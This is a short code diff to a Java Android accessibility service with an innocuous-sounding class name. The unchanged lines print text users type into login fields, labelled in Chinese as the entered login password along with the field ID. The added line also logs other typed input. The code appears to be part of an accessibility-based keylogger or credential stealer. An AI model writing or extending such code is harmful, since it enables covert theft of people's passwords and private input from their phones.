@@ -317,6 +317,7 @@ public class NotionalPoolingAccessibilityService extends AccessibilityService {
                 print(String.format("输入登录密码:%s|ID:%s", text, id));
                 return true;
             } else {
+                print("输入状态:" + string);
                 return true;
             }
         }
